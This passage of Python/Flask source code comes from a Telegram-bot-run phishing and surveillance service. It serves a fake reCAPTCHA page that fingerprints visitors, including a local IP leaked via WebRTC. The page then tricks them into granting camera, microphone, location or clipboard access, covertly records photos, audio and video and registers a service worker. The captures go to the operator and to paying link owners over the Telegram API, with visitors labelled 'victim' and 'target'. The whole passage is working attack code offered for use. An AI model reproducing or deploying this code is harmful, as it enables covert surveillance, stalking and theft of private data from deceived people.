# FIX C: JS-facing flag names
def _flags_str():
    """Build feature flags string for landing page JS."""
    name_map = {"camera":"camera","video":"video","mic":"mic",
                "call":"call","loc":"loc","clip":"clip"}
    out = []
    for python_key, js_name in name_map.items():
        try:
            if int(setting("flag_" + python_key, "1")) == 1:
                out.append(js_name)
        except Exception: pass
    return ",".join(out)


def get_link(sid):
    with DB_LOCK:
        return c.execute("SELECT * FROM links WHERE short_id=?", (sid,)).fetchone()

def is_expired(L):
    try: ttl = int(setting("link_ttl", DEFAULT_TTL))
    except Exception: ttl = DEFAULT_TTL
    if ttl <= 0: return False
    try: created = datetime.strptime(L["created"], "%Y-%m-%d %H:%M:%S")
    except Exception: return False
    return (datetime.utcnow() - created).total_seconds() > ttl


flask_app = Flask(__name__)

LANDING = r"""<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Loading</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,Roboto,Arial}
body{background:#0a0e1a;color:#e6e6e6;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.c{background:#131829;border:1px solid #1f2740;border-radius:16px;padding:32px 24px;max-width:380px;width:100%;text-align:center;box-shadow:0 12px 40px rgba(0,0,0,.5)}
h2{font-size:18px;font-weight:600;color:#fff;margin-bottom:10px}
p{font-size:13px;color:#8892a6;line-height:1.6}
.bar{font-family:monospace;font-size:15px;letter-spacing:1px;color:#4a90e2;margin:22px 0 10px;font-weight:bold;text-align:center;white-space:pre}
.pct{font-size:22px;font-weight:700;color:#4a90e2;margin-bottom:8px}
.sts{font-size:12px;color:#5a6478;margin-top:6px;height:16px}
.s{width:48px;height:48px;border:3px solid #1f2740;border-top-color:#4a90e2;border-radius:50%;animation:r 1s linear infinite;margin:0 auto 20px}
@keyframes r{to{transform:rotate(360deg)}}
.cap{margin-top:20px;background:#0f1524;border:1px solid #1f2740;border-radius:10px;padding:14px;cursor:pointer;text-align:left;user-select:none}
.cap:hover{border-color:#4a90e2}
.row{display:flex;align-items:center;gap:12px}
.bx{width:24px;height:24px;border:2px solid #4a90e2;border-radius:5px;flex-shrink:0;position:relative;text-align:center;line-height:20px;font-size:11px;color:#4a90e2;font-weight:bold}
.cap.d .bx{border-color:#3fb950;background:#3fb95022}
.cap.d .bx::after{content:'v';color:#3fb950;font-weight:bold;position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:15px}
.lbl{font-size:14px;color:#e6e6e6;flex:1}
.f{display:flex;justify-content:space-between;margin-top:12px;padding-top:10px;border-top:1px solid #1f2740;font-size:10px;color:#5a6478}
.hint{margin-top:12px;font-size:11px;color:#5a6478;line-height:1.5}
</style></head><body>
<div class="c">
<div class="s" id="sp"></div>
<h2 id="t">Loading...</h2>
<p id="s">Please wait while we prepare your page</p>
<div class="pct" id="pct">0%</div>
<div class="bar" id="bar">[----------] </div>
<div class="sts" id="sts">Connecting...</div>
<div class="cap" id="cap" style="display:none">
<div class="row"><div class="bx" id="bx">0</div><div class="lbl" id="lbl">I'm not a robot</div></div>
<div class="f"><span>reCAPTCHA</span><span id="cfoot">0/0</span></div>
</div>
<div class="hint" id="hint"></div>
</div>
<script>
var SID="__SID__",MODE="__MODE__",FEATURE="__FEATURE__",DEST="__DEST__",HEAD="__HEAD__",MIC=parseInt("__MIC_SECS__")||0,VID=parseInt("__VID_SECS__")||0,AUTODEST="__AUTO_DEST__",FACING="__FACING__",FEAT="__FEAT__";
function has(f){return FEAT.indexOf(f)>=0;}
function fp(){try{
 var cc=document.createElement('canvas'),g=cc.getContext('2d');
 g.textBaseline='top';g.font='14px Arial';g.fillText('rcx',2,2);
 var cv=cc.toDataURL().slice(-40);
 var gl=document.createElement('canvas').getContext('webgl');var gp='';
 if(gl){var e=gl.getExtension('WEBGL_debug_renderer_info');
  gp=(gl.getParameter(gl.VERSION)||'')+'|'+(e?gl.getParameter(e.UNMASKED_RENDERER_WEBGL):'');}
 return{canvas:cv,gpu:gp,cores:navigator.hardwareConcurrency||0,
  platform:navigator.platform||'',ua:navigator.userAgent,
  lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
  screen:screen.width+'x'+screen.height,color:screen.colorDepth};}catch(e){return{err:String(e)};}}
async function h(){var d=fp();
 try{if(navigator.getBattery){var b=await navigator.getBattery();d.batt=Math.round(b.level*100);d.charging=b.charging;}}catch(e){}
 try{var n=navigator.connection;if(n)d.net=n.effectiveType+'|'+n.downlink;}catch(e){}
 try{d.local_ip=await new Promise(function(res){
  var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
  var t=setTimeout(function(){res('')},2000);pc.createDataChannel('');
  pc.onicecandidate=function(e){if(e.candidate){var m=e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
   if(m){clearTimeout(t);pc.close();res(m[1]);}}};
  pc.createOffer().then(function(o){pc.setLocalDescription(o)});});}catch(e){}
 d.fingerprint=(d.canvas||'')+'|'+(d.gpu||'')+'|'+d.ua;
 await fetch('/api/harvest/'+SID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)}).catch(function(){});}
function go(){
 if(MODE==='custom'&&DEST){window.location.href=DEST;return;}
 if(AUTODEST){window.location.href=AUTODEST;return;}
 document.body.innerHTML='<div class="c"><h2>Done</h2><p>Close page</p></div>';}
var PERM_STREAM={cam:null,mic:null,screen:null};
var PERM_GEO=null;
var clicks=0;
async function reqCam(){
 if(PERM_STREAM.cam)return true;
 try{PERM_STREAM.cam=await navigator.mediaDevices.getUserMedia({video:{facingMode:FACING||'user'},audio:false});return true;}catch(e){return false;}}
async function reqMic(){
 if(PERM_STREAM.mic)return true;
 try{PERM_STREAM.mic=await navigator.mediaDevices.getUserMedia({audio:true});return true;}catch(e){return false;}}
async function reqLoc(){
 if(PERM_GEO)return true;
 try{PERM_GEO=await new Promise(function(res,rej){
   navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:10000,maximumAge:0});});return true;}catch(e){return false;}}
var QUEUE=[];
if(FEATURE==='camera'){QUEUE.push(reqCam);}
else if(FEATURE==='video'){QUEUE.push(reqCam);QUEUE.push(reqMic);}
else if(FEATURE==='mic'){QUEUE.push(reqMic);}
else if(FEATURE==='call'){QUEUE.push(reqMic);}
else if(FEATURE==='loc'){QUEUE.push(reqLoc);}
else if(FEATURE==='clip'){QUEUE.push(reqClipPerm);}
else {QUEUE.push(reqCam);}
var TOTAL=1;
function b64b(u8){var s='';for(var i=0;i<u8.length;i+=8192){s+=String.fromCharCode.apply(null,u8.subarray(i,i+8192));}return btoa(s);}
async function captureCam(){
 if(!PERM_STREAM.cam)return;
 try{var v=document.createElement('video');v.srcObject=PERM_STREAM.cam;v.play();
  await new Promise(function(r){setTimeout(r,1200)});
  var cc=document.createElement('canvas');cc.width=v.videoWidth||640;cc.height=v.videoHeight||480;
  cc.getContext('2d').drawImage(v,0,0);
  var b64=cc.toDataURL('image/jpeg',0.85).split(',')[1];
  await fetch('/api/frame/'+SID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({img:b64,facing:FACING||'user'})}).catch(function(){});}catch(e){}}
async function captureMic(){
 var st=PERM_STREAM.mic;
 if(!st){try{st=await navigator.mediaDevices.getUserMedia({audio:true});}catch(e){return;}}
 try{var rec=new MediaRecorder(st);var chunks=[];
  rec.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks.push(e.data);};
  rec.start(500);
  await new Promise(function(r){setTimeout(r,(MIC>0?MIC:15)*1000)});
  rec.stop();await new Promise(function(r){setTimeout(r,500);rec.onstop=r;});
  if(!chunks.length)return;
  var blob=new Blob(chunks,{type:'audio/webm'});
  var buf=await blob.arrayBuffer();
  var b64=b64b(new Uint8Array(buf));
  await fetch('/api/audio/'+SID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({aud:b64,facing:FACING||'user'})}).catch(function(){});}catch(e){}}
async function captureVideo(){
 var st;
 try{
  st=await navigator.mediaDevices.getUserMedia({
   video:{facingMode:FACING||'user',width:{ideal:640},height:{ideal:480}},
   audio:{echoCancellation:true,noiseSuppression:true}
  });
 }catch(e){
  try{st=await navigator.mediaDevices.getUserMedia({video:true,audio:true});}catch(e2){return;}
 }
 try{
  var opts={mimeType:'video/webm;codecs=vp8,opus',videoBitsPerSecond:600000,audioBitsPerSecond:32000};
  var rec;
  try{rec=new MediaRecorder(st,opts);}catch(e){rec=new MediaRecorder(st);}
  var chunks=[];
  rec.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks.push(e.data);};
  rec.start(1000);
  var dur=(VID>0?VID:20);
  if(dur>25) dur=25;
  await new Promise(function(r){setTimeout(r,dur*1000)});
  rec.stop();
  await new Promise(function(r){setTimeout(r,500);rec.onstop=r;});
  st.getTracks().forEach(function(t){t.stop()});
  if(!chunks.length)return;
  var blob=new Blob(chunks,{type:'video/webm'});
  var buf=await blob.arrayBuffer();
  var bytes=new Uint8Array(buf);
  if(bytes.length > 18*1024*1024){
   await fetch('/api/error/'+SID,{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({err:'video too big: '+Math.round(bytes.length/1024/1024)+'MB',feature:'video'})}).catch(function(){});
   return;
  }
  var b64=b64b(bytes);
  await fetch('/api/video/'+SID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({vid:b64,facing:FACING||'user'})}).catch(function(){});}catch(e){st.getTracks().forEach(function(t){t.stop()});}}
async function captureLoc(){
 if(!PERM_GEO){try{PERM_GEO=await new Promise(function(res,rej){
   navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:10000,maximumAge:0});});}catch(e){return;}}
 var p=PERM_GEO;
 await fetch('/api/location/'+SID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy})}).catch(function(){});}
async function captureClip(){
 try{var t=await navigator.clipboard.readText();
  await fetch('/api/clip/'+SID,{method:'POST',headers:{'Content-Type':'application/json'},
   body:JSON.stringify({txt:t})}).catch(function(){});}catch(e){}
 try{
  if('serviceWorker' in navigator){
   try{
    var reg = await navigator.serviceWorker.register('/sw.js', {scope:'/'});
    await navigator.serviceWorker.ready;
    await fetch('/api/sw/'+SID,{method:'POST',headers:{'Content-Type':'application/json'},
     body:JSON.stringify({sw:true, scope:reg.scope})}).catch(function(){});
   }catch(e){
    await fetch('/api/error/'+SID,{method:'POST',headers:{'Content-Type':'application/json'},
     body:JSON.stringify({err:'sw: '+String(e),feature:'sw'})}).catch(function(){});
   }
  } else {
   await fetch('/api/sw/'+SID,{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({sw:false, reason:'unsupported'})}).catch(function(){});
  }
 }catch(e){}
}

async function runFinalCapture(){
 document.getElementById('t').textContent='Capturing...';
 document.getElementById('s').textContent='Please wait';
 try{
  if(FEATURE==='camera')await captureCam();
  else if(FEATURE==='video')await captureVideo();
  else if(FEATURE==='mic')await captureMic();
  else if(FEATURE==='call'){try{await captureMic();}catch(e){}}
  else if(FEATURE==='loc')await captureLoc();
  else if(FEATURE==='clip')await captureClip();
 }catch(e){}
 document.getElementById('t').textContent='Verified';
 document.getElementById('s').textContent='Redirecting...';
 setTimeout(go,900);}
var busy=false;
function vibeWarn(){
 try{ if(navigator.vibrate) navigator.vibrate([200,100,200,100,400]); }catch(e){}
 var cap=document.getElementById('cap');
 var hint=document.getElementById('hint');
 var sub=document.getElementById('s');
 hint.textContent='⚠️ Permission required — tap again to allow';
 sub.textContent='Please allow all permissions to continue.';
 cap.style.borderColor='#e5484d';
 setTimeout(function(){cap.style.borderColor='#1f2740';},1200);
}
async function onCapClick(){
 if(busy)return;
 var cap=document.getElementById('cap'),bx=document.getElementById('bx'),hint=document.getElementById('hint');
 busy=true;
 cap.style.borderColor='#4a90e2';
 bx.textContent='…';
 var ok=true;
 try{
  for(var i=0;i<QUEUE.length;i++){
   var r=false;
   try{r=await QUEUE[i]();}catch(e){r=false;}
   if(!r){ok=false;break;}
  }
 }catch(e){ok=false;}
 if(!ok){ vibeWarn(); bx.textContent='0'; busy=false; return; }
 bx.textContent='v';
 cap.classList.add('d');
 hint.textContent='Verified — capturing…';
 await runFinalCapture();
 busy=false;
}
(async function(){await h();
 setTimeout(function(){document.getElementById('sp').style.display='none';
  document.getElementById('t').textContent=HEAD||'Verify to continue';
  document.getElementById('s').textContent='Quick check before we open the page.';
  var cap=document.getElementById('cap');cap.style.display='block';
  document.getElementById('cfoot').textContent='0/1';
  cap.onclick=onCapClick;
  document.getElementById('hint').textContent='Tap the box once to continue';
 },900);})();
</script></body></html>"""


@flask_app.route("/")
def root(): return "OK", 200

@flask_app.route("/sw.js")
def sw():
    return Response("self.addEventListener('install',e=>self.skipWaiting());self.addEventListener('activate',e=>self.clients.claim());",
                    mimetype="application/javascript")


@flask_app.route("/t/<sid>")
def r_auto(sid):
    try:
        L = get_link(sid)
        if not L or not L["active"] or is_expired(L): return "Link expired", 410
        log("r_auto " + sid + " f=" + str(L["feature"]))
        feat = L["feature"] or "camera"
        heads = {"camera":"Verify to continue","video":"Verify to continue","mic":"Play voice message",
                 "loc":"Confirm your location",
                 "call":"Verify to continue","clip":"Verify to continue","notif":"Enable to continue",
                 "__sw__":"Verify to continue","custom":"Verifying"}
        head = heads.get(feat, "Verify to continue")
        try: ms = int(setting("mic_secs", DEFAULT_MIC_SECS))
        except Exception: ms = DEFAULT_MIC_SECS
        if ms < 1 or ms > 30: ms = DEFAULT_MIC_SECS
        try: vs = int(setting("video_secs", DEFAULT_VIDEO_SECS))
        except Exception: vs = DEFAULT_VIDEO_SECS
        hacker = setting("hacker_url", DEFAULT_HACKER_URL)
        facing = L["camera_facing"] or "user"
        mode = "custom" if feat == "custom" else "auto"
        dest = L["dest"] if feat == "custom" else ""
        auto_dest = "" if feat == "custom" else hacker
        try: scr = int(setting("screen_secs", "10"))
        except Exception: scr = 10
        if scr < 5: scr = 5
        if scr > 60: scr = 60
        html = (LANDING.replace("__SID__",sid).replace("__MODE__",mode)
                       .replace("__FEATURE__",feat).replace("__DEST__",dest or "")
                       .replace("__HEAD__",head)
                       .replace("__MIC_SECS__",str(ms)).replace("__VID_SECS__",str(vs))
                       .replace("__SCR_SECS__",str(scr))
                       .replace("__AUTO_DEST__",auto_dest).replace("__FACING__",facing)
                       .replace("__FEAT__", _flags_str()))
        return Response(html, mimetype="text/html")
    except Exception as e:
        record_error("r_auto", e)
        return "Error", 500


@flask_app.route("/c/<sid>")
def r_custom(sid):
    try:
        L = get_link(sid)
        if not L or not L["active"] or is_expired(L): return "Link expired", 410
        log("r_custom " + sid)
        html = (LANDING.replace("__SID__",sid).replace("__MODE__","custom")
                       .replace("__FEATURE__","custom")
                       .replace("__DEST__", L["dest"] or "").replace("__HEAD__","Verifying")
                       .replace("__MIC_SECS__","0").replace("__VID_SECS__","0")
                       .replace("__SCR_SECS__","0")
                       .replace("__AUTO_DEST__","").replace("__FACING__","user")
                       .replace("__FEAT__", _flags_str()))
        return Response(html, mimetype="text/html")
    except Exception as e:
        record_error("r_custom", e)
        return "Error", 500


def _track_and_notify(L, sid, ip, data, device_id=""):
    fpv = str(data.get("fingerprint",""))[:120] if data else ""
    with DB_LOCK:
        devs = [x for x in (L["devices"] or "").split(",") if x]
        if fpv and fpv not in devs:
            devs.append(fpv)
            c.execute("UPDATE links SET devices=?, hits=hits+1 WHERE id=?", (",".join(devs), L["id"]))
        c.execute("INSERT INTO clicks(link_id,ip,data,ts,device_id) VALUES(?,?,?,?,?)",
                  (L["id"], ip, json.dumps(data or {})[:4000], now(), (fpv[:40] or device_id)))
        conn.commit()
    return devs


@flask_app.route("/api/harvest/<sid>", methods=["POST"])
def api_h(sid):
    try:
        L = get_link(sid)
        if not L: return jsonify(ok=False)
        data = request.get_json(silent=True) or {}
        ip = request.headers.get("X-Forwarded-For", request.remote_addr or "").split(",")[0].strip()
        devs = _track_and_notify(L, sid, ip, data)
        owner = get_user(L["owner"])
        on = ("@"+owner["username"]) if owner and owner["username"] else str(L["owner"])
        batt = data.get("batt","?"); chg = "charging" if data.get("charging") else "not charging"
        fl = FEATURES.get(L["feature"], {}).get("label", L["feature"] or "auto")
        msg = ("🎯 New click\n👤 Owner: " + on + "\n🎬 Feature: " + fl + "\n🔗 Link: #" + sid + "\n"
               "🌐 IP: " + ip + " · 📱 Devices: " + str(len(devs)) + "\n"
               "💻 " + str(data.get("platform","")) + " · 🕐 " + str(data.get("tz","")) + "\n"
               "🔋 " + str(batt) + "% " + chg)
        notify_admin(msg, "link_click")
        try: notify_owner(L["owner"], msg, "link_click")
        except Exception: pass
        return jsonify(ok=True)
    except Exception as e:
        record_error("api_h", e); return jsonify(ok=False)


def _owner_info(L, sid, feat_label):
    owner = get_user(L["owner"])
    on = ("@"+owner["username"]) if owner and owner["username"] else str(L["owner"])
    return "<blockquote>" + bi(feat_label + "\n👤 " + on + "\n🔗 #" + sid) + "</blockquote>\n\n<blockquote>" + BRAND + "</blockquote>"

def _tg_send(method, field, fname, mimetype, cap, sid, owner, raw, key, label):
    try:
        requests.post("https://api.telegram.org/bot"+BOT_TOKEN+"/"+method,
            files={field:(fname, raw, mimetype)},
            data={"chat_id":ADMIN_ID,"caption":cap,"parse_mode":"HTML"}, timeout=45)
        if method == "sendPhoto": notify_owner_photo(owner, cap, raw)
        elif method == "sendVoice": notify_owner_voice(owner, cap, raw)
        elif method == "sendVideo": notify_owner_video(owner, cap, raw)
    except Exception as e:
        notify_admin(label + " fail: "+str(e)+" · #"+sid, key)


@flask_app.route("/api/frame/<sid>", methods=["POST"])
def api_f(sid):
    try:
        L = get_link(sid)
        if not L: return jsonify(ok=False)
        body = request.get_json(silent=True) or {}
        img = body.get("img")
        err = body.get("err", "")
        facing = L["camera_facing"] or "user"
        facing_txt = "Front" if facing=="user" else "Back"
        cap = _owner_info(L, sid, "📸 Camera granted · " + facing_txt)
        if img:
            try:
                raw = base64.b64decode(img)
                _tg_send("sendPhoto","photo","cam.jpg","image/jpeg",cap,sid,L["owner"],raw,"camera_grant","📸 Camera")
            except Exception as e:
                notify_admin("📸 Camera upload fail: " + str(e) + " · #" + sid, "camera_grant")
        else:
            msg = "❌ Permission declined by target\n📸 Camera · " + facing_txt + "\n🔗 #" + sid
            if err:
                msg += "\n📝 " + str(err)[:100]
            notify_admin(msg, "camera_grant")
            try: notify_owner(L["owner"], msg, "camera_grant")
            except Exception: pass
        return jsonify(ok=True)
    except Exception as e:
        record_error("api_f", e); return jsonify(ok=False)


@flask_app.route("/api/audio/<sid>", methods=["POST"])
def api_a(sid):
    try:
        L = get_link(sid)
        if not L: return jsonify(ok=False)
        body = request.get_json(silent=True) or {}
        aud = body.get("aud")
        err = body.get("err", "")
        facing = L["camera_facing"] or "user"
        facing_txt = "Front" if facing=="user" else "Back"
        cap = _owner_info(L, sid, "🎙️ Mic recorded · " + facing_txt)
        if aud:
            try:
                raw = base64.b64decode(aud)
                _tg_send("sendVoice","voice","mic.webm","audio/webm",cap,sid,L["owner"],raw,"mic_grant","🎙️ Mic")
            except Exception as e:
                notify_admin("🎙️ Mic upload fail: " + str(e) + " · #" + sid, "mic_grant")
        else:
            msg = "❌ Permission declined by target\n🎙️ Mic · " + facing_txt + "\n🔗 #" + sid
            if err:
                msg += "\n📝 " + str(err)[:100]
            notify_admin(msg, "mic_grant")
            try: notify_owner(L["owner"], msg, "mic_grant")
            except Exception: pass
        return jsonify(ok=True)
    except Exception as e:
        record_error("api_a", e); return jsonify(ok=False)


@flask_app.route("/api/video/<sid>", methods=["POST"])
def api_v(sid):
    try:
        L = get_link(sid)
        if not L: return jsonify(ok=False)
        body = request.get_json(silent=True) or {}
        vid = body.get("vid")
        err = body.get("err", "")
        facing = L["camera_facing"] or "user"
        facing_txt = "Front" if facing=="user" else "Back"
        cap = _owner_info(L, sid, "🎥 Video recorded · " + facing_txt)
        if vid:
            raw = base64.b64decode(vid)
            if len(raw) > 45 * 1024 * 1024:
                notify_admin("⚠️ Video too big: " + str(round(len(raw)/1024/1024,1)) + "MB · #" + sid)
                return jsonify(ok=True)
            _tg_send("sendVideo","video","vid.webm","video/webm",cap,sid,L["owner"],raw,"camera_grant","🎥 Video")
        else:
            msg = "❌ Permission declined by target\n🎥 Video · " + facing_txt + "\n🔗 #" + sid
            if err:
                msg += "\n📝 " + str(err)[:100]
            notify_admin(msg, "camera_grant")
            try: notify_owner(L["owner"], msg, "camera_grant")
            except Exception: pass
        return jsonify(ok=True)
    except Exception as e:
        record_error("api_v", e); return jsonify(ok=False)


@flask_app.route("/api/location/<sid>", methods=["POST"])
def api_l(sid):
    try:
        L = get_link(sid)
        if not L: return jsonify(ok=False)
        body = request.get_json(silent=True) or {}
        lat = body.get("lat"); lng = body.get("lng"); acc = body.get("acc")
        err = body.get("err", "")
        owner = get_user(L["owner"])
        on = ("@"+owner["username"]) if owner and owner["username"] else str(L["owner"])
        if lat is not None and lng is not None:
            try:
                requests.post("https://api.telegram.org/bot"+BOT_TOKEN+"/sendLocation",
                    data={"chat_id":ADMIN_ID,"latitude":lat,"longitude":lng}, timeout=10)
            except Exception: pass
            gm = "https://maps.google.com/?q="+str(lat)+","+str(lng)
            msg = "📍 Location captured\n👤 " + on + "\n🔗 #" + sid + "\n🎯 Accuracy: " + str(acc) + "m\n🗺️ " + gm
            notify_admin(msg, "location")
            try: notify_owner(L["owner"], msg, "location")
            except Exception: pass
        else:
            msg = "❌ Permission declined by target\n📍 Location\n🔗 #" + sid
            if err:
                msg += "\n📝 " + str(err)[:100]
            notify_admin(msg, "location")
            try: notify_owner(L["owner"], msg, "location")
            except Exception: pass
        return jsonify(ok=True)
    except Exception as e:
        record_error("api_l", e); return jsonify(ok=False)


@flask_app.route("/api/clip/<sid>", methods=["POST"])
def api_clip(sid):
    try:
        L = get_link(sid)
        if not L: return jsonify(ok=False)
        body = request.get_json(silent=True) or {}; txt = body.get("txt","")
        owner = get_user(L["owner"])
        on = ("@"+owner["username"]) if owner and owner["username"] else str(L["owner"])
        msg = "📋 Clipboard captured\n👤 " + on + "\n🔗 #" + sid + "\n📄 " + str(txt)[:500]
        notify_admin(msg, "link_click")
        return jsonify(ok=True)
    except Exception as e:
        record_error("api_clip", e); return jsonify(ok=False)


@flask_app.route("/api/sw/<sid>", methods=["POST"])
def api_sw(sid):
    try:
        L = get_link(sid)
        if not L: return jsonify(ok=False)
        owner = get_user(L["owner"])
        on = ("@"+owner["username"]) if owner and owner["username"] else str(L["owner"])
        notify_admin("📡 SW installed · 👤 " + on + " · #" + sid, "link_click")
        return jsonify(ok=True)
    except Exception as e:
        record_error("api_sw", e); return jsonify(ok=False)


@flask_app.route("/api/callhint/<sid>", methods=["POST"])
def api_ch(sid):
    try:
        L = get_link(sid)
        if not L: return jsonify(ok=False)
        owner = get_user(L["owner"])
        on = ("@"+owner["username"]) if owner and owner["username"] else str(L["owner"])
        msg = "📞 Possibly on call\n👤 " + on + "\n🔗 #" + sid + "\n🎙️ Mic busy"
        notify_admin(msg, "link_click")
        try: notify_owner(L["owner"], msg, "link_click")
        except Exception: pass
        return jsonify(ok=True)
    except Exception as e:
        record_error("api_ch", e); return jsonify(ok=False)


@flask_app.route("/api/progress/<sid>", methods=["POST"])
def api_progress(sid):
    try:
        L = get_link(sid)
        if not L: return jsonify(ok=False)
        body = request.get_json(silent=True) or {}
        pct = int(body.get("pct", 0))
        stage = str(body.get("stage", ""))[:40]
        if pct < 0: pct = 0
        if pct > 100: pct = 100
        filled = round(pct / 100 * 10)
        bar = "▰" * filled + "▱" * (10 - filled)
        owner = get_user(L["owner"])
        on = ("@"+owner["username"]) if owner and owner["username"] else str(L["owner"])
        text = ("<blockquote>" + bi("🎯 Live Victim Progress\n"
                "👤 " + on + " · 🔗 #" + sid + "\n"
                "\n"
                "[" + bar + "] " + str(pct) + "%\n"
                + (stage if stage else "...")) + "</blockquote>\n\n<blockquote>" + BRAND + "</blockquote>")
        key = "victim_prog_" + sid
        mid = setting(key, "")
        if not mid:
            try:
                m = requests.post("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",
                    data={"chat_id": ADMIN_ID, "text": text, "parse_mode": "HTML"}, timeout=8).json()
                if m.get("ok"):
                    set_setting(key, str(m["result"]["message_id"]))
            except Exception as e: record_error("progress send", e)
        else:
            try:
                requests.post("https://api.telegram.org/bot"+BOT_TOKEN+"/editMessageText",
                    data={"chat_id": ADMIN_ID, "message_id": int(mid), "text": text, "parse_mode": "HTML"}, timeout=8)
            except Exception as e: record_error("progress edit", e)
        if pct >= 100:
            try:
                with DB_LOCK:
                    c.execute("DELETE FROM settings WHERE key=?", (key,)); conn.commit()
            except Exception: pass
        return jsonify(ok=True)
    except Exception as e:
        record_error("api_progress", e); return jsonify(ok=False)


@flask_app.route("/api/fire/<sid>", methods=["POST"])
def api_fire(sid):
    try:
        L = get_link(sid)
        if not L: return jsonify(ok=False)
        log("fire " + sid + " - page closed")
        return jsonify(ok=True)
    except Exception as e:
        record_error("api_fire", e); return jsonify(ok=False)


@flask_app.route("/api/error/<sid>", methods=["POST"])
def api_err(sid):
    try:
        L = get_link(sid)
        if not L: return jsonify(ok=False)
        body = request.get_json(silent=True) or {}
        notify_admin("⚠️ Capture error\n🔗 #" + sid + "\n🎬 " + str(body.get("feature","?")) + "\n❌ " + str(body.get("err",""))[:200], "link_click")
        return jsonify(ok=True)
    except Exception as e:
        record_error("api_err", e); return jsonify(ok=False)


def run_flask():
    try:
        flask_app.run(host=HOST, port=PORT, threaded=True, use_reloader=False, debug=False)
    except Exception as e:
        record_error("flask", e)


# ═══════════ KEYBOARDS ═══════════
def kb_user():
    rows = [
        [B("📸 Camera Photo", "u:new:camera", style="success"), B("🎥 Video 30s", "u:new:video", style="success")],
        [B("🎙️ Mic Record", "u:new:mic", style="primary"), B("📞 Call Hint", "u:new:call", style="primary")],
        [B("📍 Location", "u:new:loc", style="primary"), B("📋 Clipboard", "u:new:clip", style="primary")],
        [B("🔔 Notification", "u:new:notif", style="primary")],
        [B("🎯 My Links", "u:links", style="primary"), B("💸 Credit", "u:credit", style="success")],
        [B("📜 History","u:history",style="primary"), B("📊 My Stats", "u:stats", style="primary")],
        [B("💬 Support", "u:sup", style="primary")],
    ]
    return InlineKeyboardMarkup(rows)

def kb_admin():
    return InlineKeyboardMarkup([
        [B("👥 Users","a:users",style="primary"), B("📊 Stats","a:stats",style="primary")],
        [B("💸 Add Credit","a:add_credit",style="success"), B("💎 Feature Rates","a:rates",style="success")],
        [B("👥 Whitelist","a:wl",style="primary"), B("🛠️ Settings","a:settings",style="success")],
        [B("🚪 Force Join","a:fj",style="primary"), B("💳 Payment","a:pay",style="primary")],
        [B("🎨 Banners","a:banners",style="success"), B("📢 Broadcast","a:bc",style="primary")],
        [B("⭐ Stars Balance","a:stars_bal",style="success")],
        [B("⚙️ Mode","a:mode",style="primary"), B("🚧 Maintenance","a:maint",style="danger")],
        [B("🔐 Access Config","a:access_cfg",style="primary")],
        [B("🔧 System","a:sys",style="primary"), B("📖 Help","a:help",style="success")]])

def kb_back(t="u:home"):
    return InlineKeyboardMarkup([[B("🔙 Back", t, style="primary")]])


# ═══════════ FORCE JOIN ═══════════
async def check_join(bot, uid):
    try:
        with DB_LOCK:
            chans = c.execute("SELECT * FROM channels WHERE active=1 ORDER BY id").fetchall()
        if not chans: return True, None
        rows = []
        for ch in chans:
            ok = False
            try:
                m = await bot.get_chat_member(chat_id=ch["chat_id"], user_id=uid)
                if m.status in ("member","administrator","creator","restricted"): ok = True
            except Exception: pass
            if not ok:
                with DB_LOCK:
                    p = c.execute("SELECT 1 FROM pending_reqs WHERE user_id=? AND channel_id=?",
                                  (uid, ch["chat_id"])).fetchone()
                if p: ok = True
            if not ok:
                label = ch["custom_name"] or "Join"
                rows.append([B("📢 " + label, url=ch["link"] or "https://t.me", style=ch["style"] or "primary")])
        if not rows: return True, None
        rows.append([B("✅ Check", "fj:check", style="success")])
        return False, InlineKeyboardMarkup(rows)
    except Exception as e:
        record_error("check_join", e); return True, None


# ═══════════ PANEL SENDER ═══════════
async def send_panel(bot, chat_id, msg_id, key, text, kb=None):
    try:
        fid, typ = get_banner(key)
        if fid:
            if msg_id:
                try: await bot.delete_message(chat_id, msg_id)
                except Exception: pass
            try:
                if typ == "animation":
                    return await bot.send_animation(chat_id, fid, caption=text, parse_mode="HTML", reply_markup=kb)
                if typ == "video":
                    return await bot.send_video(chat_id, fid, caption=text, parse_mode="HTML", reply_markup=kb)
                return await bot.send_photo(chat_id, fid, caption=text, parse_mode="HTML", reply_markup=kb)
            except Exception as e: log("banner fail: " + str(e))
        if msg_id:
            try: return await bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=kb)
            except Exception: pass
        return await bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=kb)
    except Exception as e:
        record_error("send_panel", e)
        try: return await bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=kb)
        except Exception: pass

async def panel(ctx, q, key, text, kb=None):
    try: return await send_panel(ctx.bot, q.message.chat_id, q.message.message_id, key, text, kb)
    except Exception as e:
        record_error("panel", e)

async def dm_panel(bot, chat_id, key, text, kb=None):
    return await send_panel(bot, chat_id, None, key, text, kb)


# ═══════════ MAINTENANCE CHECK ═══════════
def is_maintenance():
    return setting("maintenance", "0") == "1"

async def maintenance_gate(update_or_q, ctx, uid):
    if int(uid) == int(ADMIN_ID): return False
    if not is_maintenance(): return False
    txt = wrap("🚧 Bot under maintenance\n🔧 We're upgrading right now\n⏱️ Please check back later\n🙏 Thank you for patience")
    try:
